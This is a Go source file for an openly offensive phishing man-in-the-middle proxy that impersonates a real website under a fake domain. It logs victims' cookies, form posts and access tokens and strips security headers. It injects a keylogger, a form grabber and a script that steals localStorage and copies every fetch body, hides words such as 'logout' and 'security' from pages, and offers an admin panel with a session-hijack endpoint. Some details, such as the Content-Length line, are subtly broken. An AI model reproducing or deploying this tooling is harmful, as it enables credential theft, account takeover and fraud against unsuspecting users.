package main

import (
	"bytes"
	"crypto/tls"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/net/html"
)

const (
	targetURL       = "https://realwebsite.com"
	fakeDomain      = "fakewebsite.com"
	proxyPort       = ":443"
	certFile        = "cert.pem"
	keyFile         = "key.pem"
	sessionDB       = "sessions.db"
	adminPort       = ":8081" // Control panel port
	jsAgent         = "static/agent.js"
)

var (
	logFile         *os.File
	db              *sql.DB
	activeSessions  = make(map[string]Session)
	sessionMutex    sync.Mutex
	jsInjection     []byte
	blockedKeywords = []string{"logout", "security", "report"}
)

type Session struct {
	ID         string
	Cookies    string
	UserAgent  string
	IP         string
	LastActive time.Time
	Metadata   string
}

func main() {
	initLogger()
	initDatabase()
	loadJSInjections()
	startAdminPanel()

	log.Println("Starting Ultimate MITM Proxy on", fakeDomain+proxyPort)

	target, _ := url.Parse(targetURL)
	proxy := &httputil.ReverseProxy{
		Director:       directorFunc(target),
		ModifyResponse: modifyResponseFunc(),
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableCompression:  true,
			MaxIdleConns:        100,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
		},
	}

	// Start HTTPS server
	server := &http.Server{
		Addr:    proxyPort,
		Handler: proxy,
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS12,
			PreferServerCipherSuites: true,
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
			},
		},
	}

	log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
}

func directorFunc(target *url.URL) func(*http.Request) {
	return func(req *http.Request) {
		// Session tracking
		sessionID := getSessionID(req)
		updateSession(sessionID, req)

		// Modify request to target
		req.Header.Set("X-Forwarded-Host", req.Host)
		req.Host = target.Host
		req.URL.Scheme = target.Scheme
		req.URL.Host = target.Host

		// Remove security headers
		req.Header.Del("Origin")
		req.Header.Del("Referer")

		// Log sensitive data
		logRequestData(sessionID, req)
	}
}

func modifyResponseFunc() func(*http.Response) error {
	return func(resp *http.Response) error {
		// Intercept API responses
		if strings.Contains(resp.Header.Get("Content-Type"), "application/json") {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			
			var jsonData map[string]interface{}
			if err := json.Unmarshal(body, &jsonData); err == nil {
				if token, exists := jsonData["access_token"]; exists {
					logSessionData("ACCESS_TOKEN", fmt.Sprintf("%v", token))
				}
			}
			
			resp.Body = io.NopCloser(bytes.NewReader(body))
			return nil
		}

		// Only modify HTML responses
		if !strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
			return nil
		}

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return err
		}
		defer resp.Body.Close()

		modifiedBody := body
		
		// 1. Domain replacement
		modifiedBody = replaceAllDomains(modifiedBody)
		
		// 2. JavaScript injection
		modifiedBody = injectJS(modifiedBody)
		
		// 3. Remove security headers
		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("X-Frame-Options")
		resp.Header.Del("Strict-Transport-Security")
		
		// 4. Block certain content
		modifiedBody = blockSensitiveContent(modifiedBody)
		
		// 5. Session binding
		modifiedBody = bindSession(modifiedBody, resp.Request)

		resp.Body = io.NopCloser(bytes.NewReader(modifiedBody))
		resp.Header.Set("Content-Length", string(len(modifiedBody)))
		
		return nil
	}
}

// Advanced content manipulation functions
func replaceAllDomains(body []byte) []byte {
	patterns := []struct {
		old string
		new string
	}{
		{targetURL, "https://" + fakeDomain},
		{"realwebsite.com", fakeDomain},
		{strings.Replace(targetURL, "https://", "", 1), fakeDomain},
	}
	
	for _, p := range patterns {
		body = bytes.ReplaceAll(body, []byte(p.old), []byte(p.new))
	}
	return body
}

func injectJS(body []byte) []byte {
	// Parse HTML to find optimal injection point
	doc, err := html.Parse(bytes.NewReader(body))
	if err != nil {
		return append(jsInjection, body...)
	}

	var b bytes.Buffer
	html.Render(&b, doc)
	return bytes.Replace(b.Bytes(), []byte("</head>"), 
		append([]byte("<script src=\"/"+jsAgent+"\"></script></head>"), jsInjection...), 1)
}

func blockSensitiveContent(body []byte) []byte {
	for _, keyword := range blockedKeywords {
		if bytes.Contains(body, []byte(keyword)) {
			re := regexp.MustCompile(`(?i)` + regexp.QuoteMeta(keyword))
			body = re.ReplaceAll(body, []byte("[redacted]"))
		}
	}
	return body
}

func bindSession(body []byte, req *http.Request) []byte {
	sessionID := getSessionID(req)
	if sessionID == "" {
		return body
	}
	
	script := fmt.Sprintf(`<script>sessionStorage.setItem('session_id','%s');</script>`, sessionID)
	return bytes.Replace(body, []byte("</body>"), append([]byte(script), []byte("</body>")...), 1)
}

// Session management functions
func getSessionID(req *http.Request) string {
	if cookie, err := req.Cookie("session_id"); err == nil {
		return cookie.Value
	}
	return ""
}

func updateSession(sessionID string, req *http.Request) {
	if sessionID == "" {
		return
	}

	sessionMutex.Lock()
	defer sessionMutex.Unlock()

	session := activeSessions[sessionID]
	if session.ID == "" {
		session = Session{
			ID:         sessionID,
			IP:         strings.Split(req.RemoteAddr, ":")[0],
			UserAgent:  req.UserAgent(),
			LastActive: time.Now(),
		}
	}

	if cookies := req.Header.Get("Cookie"); cookies != "" {
		session.Cookies = cookies
	}

	activeSessions[sessionID] = session
	saveSessionToDB(session)
}

// Admin control panel
func startAdminPanel() {
	go func() {
		http.HandleFunc("/sessions", func(w http.ResponseWriter, r *http.Request) {
			sessionMutex.Lock()
			defer sessionMutex.Unlock()
			
			json.NewEncoder(w).Encode(activeSessions)
		})
		
		http.HandleFunc("/hijack", func(w http.ResponseWriter, r *http.Request) {
			sessionID := r.URL.Query().Get("id")
			if session, exists := activeSessions[sessionID]; exists {
				http.SetCookie(w, &http.Cookie{
					Name:  "session_token",
					Value: session.Cookies,
				})
				fmt.Fprintf(w, "Session hijacked! Cookies injected.")
			}
		})
		
		log.Println("Admin panel running on http://localhost"+adminPort)
		log.Fatal(http.ListenAndServe(adminPort, nil))
	}()
}

// Initialization functions
func initLogger() {
	var err error
	logFile, err = os.OpenFile("captured_advanced.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
}

func initDatabase() {
	var err error
	db, err = sql.Open("sqlite3", sessionDB)
	if err != nil {
		log.Fatal(err)
	}
	
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS sessions (
		id TEXT PRIMARY KEY,
		cookies TEXT,
		user_agent TEXT,
		ip TEXT,
		last_active TIMESTAMP,
		metadata TEXT
	)`)
	if err != nil {
		log.Fatal(err)
	}
}

func loadJSInjections() {
	jsInjection = []byte(fmt.Sprintf(`<script>
	// Keylogger
	document.addEventListener('keydown', function(e) {
		fetch('/log?type=key&data=' + e.key);
	});
	
	// Form grabber
	document.querySelectorAll('form').forEach(form => {
		form.addEventListener('submit', function(e) {
			const data = new FormData(this);
			fetch('/log?type=form', { method: 'POST', body: data });
		});
	});
	
	// Session maintainer
	setInterval(() => {
		fetch('/ping');
	}, 30000);
</script>`))
	
	// Save JS agent file
	os.WriteFile(jsAgent, []byte(`// Advanced client-side agent
(function() {
	// Steal localStorage
	const stolenData = JSON.stringify(localStorage);
	fetch('/exfil', {
		method: 'POST',
		body: stolenData
	});
	
	// Hook all fetch requests
	const originalFetch = window.fetch;
	window.fetch = function(url, options) {
		if (options && options.body) {
			fetch('/log?type=api', {
				method: 'POST',
				body: JSON.stringify({
					url: url,
					data: options.body
				})
			});
		}
		return originalFetch.apply(this, arguments);
	};
})();`), 0644)
}

// Utility functions
func logRequestData(sessionID string, req *http.Request) {
	data := fmt.Sprintf("[%s] %s %s\nCookies: %s\nUser-Agent: %s\nIP: %s\n",
		time.Now().Format(time.RFC3339),
		req.Method,
		req.URL.String(),
		req.Header.Get("Cookie"),
		req.UserAgent(),
		strings.Split(req.RemoteAddr, ":")[0])

	if req.Method == "POST" {
		body, _ := io.ReadAll(req.Body)
		req.Body = io.NopCloser(bytes.NewReader(body))
		data += "Body: " + string(body) + "\n"
	}

	logFile.WriteString(data + "\n")
}

func logSessionData(key, value string) {
	logFile.WriteString(fmt.Sprintf("[%s] %s: %s\n", 
		time.Now().Format(time.RFC3339), key, value))
}

func saveSessionToDB(session Session) {
	_, err := db.Exec(`INSERT OR REPLACE INTO sessions 
		(id, cookies, user_agent, ip, last_active, metadata) 
		VALUES (?, ?, ?, ?, ?, ?)`,
		session.ID,
		session.Cookies,
		session.UserAgent,
		session.IP,
		session.LastActive,
		session.Metadata)
	
	if err != nil {
		log.Println("DB error:", err)
	}
}